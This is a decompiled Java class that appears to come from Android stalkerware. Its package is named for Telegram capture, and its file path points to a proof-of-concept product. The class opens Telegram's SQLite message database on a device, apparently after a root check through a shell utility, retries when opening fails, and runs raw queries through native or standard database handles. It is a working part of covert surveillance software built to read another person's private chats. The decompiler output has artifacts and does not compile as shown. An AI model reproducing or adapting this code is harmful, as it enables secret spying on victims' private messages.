package com.vvt.capture.telegram.internal.SQLite;

import android.database.Cursor;
import android.os.Build;
import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.capture.telegram.d;
import com.vvt.shell.ShellUtil;

public class SQLiteDatabase
{
  private static final boolean Is64Bit = false;
  private static final boolean LOGE = false;
  private static final boolean LOGV = a.a;
  private static final String TAG = "SQLiteDatabase";
  private static android.database.sqlite.SQLiteDatabase mSQLiteDatabase;
  private static SQLiteDatabaseNative mSQLiteDatabaseNative;
  private static SQLiteDatabase mSqLiteDatabase;
  
  static
  {
    LOGE = a.e;
    Object localObject = new com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase;
    ((SQLiteDatabase)localObject).<init>();
    mSqLiteDatabase = (SQLiteDatabase)localObject;
    localObject = Build.CPU_ABI;
    String str = "arm64-v8a";
    boolean bool = ((String)localObject).equalsIgnoreCase(str);
    if (bool) {
      bool = true;
    }
    for (;;)
    {
      Is64Bit = bool;
      return;
      bool = false;
      localObject = null;
    }
  }
  
  private String[] convertObjs2Strings(Object[] paramArrayOfObject)
  {
    int i = 0;
    String[] arrayOfString = new String[paramArrayOfObject.length];
    int j = paramArrayOfObject.length;
    int k = 0;
    while (i < j)
    {
      String str = String.valueOf(paramArrayOfObject[i]);
      arrayOfString[k] = str;
      k += 1;
      i += 1;
    }
    return arrayOfString;
  }
  
  public static android.database.sqlite.SQLiteDatabase getReadableDatabase(String paramString)
  {
    int i = 0;
    Object localObject = null;
    int k = 1;
    int m;
    if (paramString == null)
    {
      m = LOGV;
      if (m == 0) {}
    }
    for (;;)
    {
      return (android.database.sqlite.SQLiteDatabase)localObject;
      m = ShellUtil.b(paramString);
      if (m != 0)
      {
        android.database.sqlite.SQLiteDatabase localSQLiteDatabase1 = tryOpenDatabase(paramString, k);
        i = 5;
        localObject = localSQLiteDatabase1;
        m = i;
        while ((localObject == null) && (m > 0))
        {
          boolean bool = LOGV;
          if (bool) {}
          long l = 1000L;
          SystemClock.sleep(l);
          android.database.sqlite.SQLiteDatabase localSQLiteDatabase2 = tryOpenDatabase(paramString, k);
          int j = m + -1;
          m = j;
          localObject = localSQLiteDatabase2;
        }
      }
    }
  }
  
  public static SQLiteDatabase getReadableDatabase(String paramString1, String paramString2)
  {
    boolean bool = d.a(paramString2);
    if (bool)
    {
      bool = Is64Bit;
      if (bool)
      {
        localObject = getReadableDatabase(paramString1);
        mSQLiteDatabase = (android.database.sqlite.SQLiteDatabase)localObject;
      }
    }
    for (Object localObject = mSqLiteDatabase;; localObject = null)
    {
      return (SQLiteDatabase)localObject;
      localObject = getReadableNativeDatabase(paramString1, paramString2);
      mSQLiteDatabaseNative = (SQLiteDatabaseNative)localObject;
      break;
      bool = false;
    }
  }
  
  private static SQLiteDatabaseNative getReadableNativeDatabase(String paramString1, String paramString2)
  {
    Object localObject1 = null;
    if (paramString1 != null) {}
    for (;;)
    {
      try
      {
        bool = LOGV;
        if (bool) {}
        bool = ShellUtil.b(paramString1);
        if (!bool) {
          break label53;
        }
        SQLiteDatabaseNative localSQLiteDatabaseNative = new com/vvt/capture/telegram/internal/SQLite/SQLiteDatabaseNative;
        localSQLiteDatabaseNative.<init>(paramString1, paramString2);
        localObject1 = localSQLiteDatabaseNative;
      }
      catch (Exception localException)
      {
        bool = LOGE;
        if (!bool) {
          continue;
        }
        continue;
      }
      return (SQLiteDatabaseNative)localObject1;
      label53:
      boolean bool = false;
      Object localObject2 = null;
    }
  }
  
  private Cursor rawQuery(android.database.sqlite.SQLiteDatabase paramSQLiteDatabase, String paramString, String[] paramArrayOfString)
  {
    return paramSQLiteDatabase.rawQuery(paramString, paramArrayOfString);
  }
  
  private static android.database.sqlite.SQLiteDatabase tryOpenDatabase(String paramString, int paramInt)
  {
    android.database.sqlite.SQLiteDatabase localSQLiteDatabase = null;
    if (paramString != null) {
      bool = false;
    }
    try
    {
      localSQLiteDatabase = android.database.sqlite.SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = LOGE;
        if ((!bool) || (0 != 0)) {
          null.close();
        }
      }
    }
    return localSQLiteDatabase;
  }
  
  public void close()
  {
    boolean bool = Is64Bit;
    Object localObject;
    if (bool)
    {
      localObject = mSQLiteDatabase;
      ((android.database.sqlite.SQLiteDatabase)localObject).close();
    }
    for (;;)
    {
      return;
      localObject = mSQLiteDatabaseNative;
      ((SQLiteDatabaseNative)localObject).close();
    }
  }
  
  public SQLiteCursor queryFinalized(String paramString, Object... paramVarArgs)
  {
    SQLiteCursor localSQLiteCursor = new com/vvt/capture/telegram/internal/SQLite/SQLiteCursor;
    localSQLiteCursor.<init>();
    boolean bool = Is64Bit;
    String[] arrayOfString;
    if (bool)
    {
      localObject = mSQLiteDatabase;
      arrayOfString = convertObjs2Strings(paramVarArgs);
    }
    for (Object localObject = rawQuery((android.database.sqlite.SQLiteDatabase)localObject, paramString, arrayOfString);; localObject = mSQLiteDatabaseNative.queryFinalized(paramString, paramVarArgs))
    {
      localSQLiteCursor.setCursor(localObject);
      return localSQLiteCursor;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */